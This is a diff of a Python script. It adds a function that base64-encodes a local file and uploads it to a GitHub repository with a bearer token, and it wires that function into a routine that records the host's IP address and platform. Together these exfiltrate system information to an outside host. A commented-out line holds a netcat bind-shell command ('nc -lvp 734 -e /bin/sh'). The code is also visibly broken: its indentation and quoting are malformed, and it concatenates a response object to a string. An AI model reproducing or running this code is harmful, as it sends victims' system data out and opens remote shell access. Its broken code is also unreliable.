@@ -10,7 +10,7 @@ try:
 except:
 	os.system('python -m pip install PyGithub')
 
-
+urls=''https://api.github.com/repos/kaki714/Not/contents/data/<filename>''
 def create_file(file_path, content):
     with open(file_path, "w", encoding="utf-8") as file:
         file.write(content)
@@ -18,16 +18,21 @@ def create_file(file_path, content):
 def delete_file(file_path):
     os.remove(file_path)
 
-def upload_File(filename,sha=None):
-	updated=False
-	new_sha,content=downloadFile(filename)
-	if (not sha or sha!=new_sha) and (new_sha):
-		file=open(filename,'w')
-		file.write(content)
-		file.close()
-		updated=True
-		print('[!] Updating '+filename)
-	return updated,new_sha
+def upload_File(filename,token):
+	 with open(filename, "rb") as f:      
+	# Encoding 
+	encodedData = base64.b64encode(f.read())
+	headers = {
+		"Authorization": f'''Bearer {token}''',
+		"Content-type": "application/vnd.github+json"
+		}      
+	data = {          
+		"message": "se ha subido una imagen", 
+		# Put your commit message here.
+		"content": encodedData.decode("utf-8")
+		}
+	r = requests.put(urls, headers=headers, json=data)
+	return r
 
         
 
@@ -50,6 +55,8 @@ def run(token):
     stmnt= 'Info: '+ IPAddr+' System:'+sysconfig.get_platform()
     print(stmnt)
     create_file(fname,stmnt)
+    authi=upload_File(fname,token)
+    print('file uploaded status: '+authi)
     if "Linux" in platform.system():
         #upload_file_to_github(archive)
         #os.system( 'nc -lvp 734 -e /bin/sh')
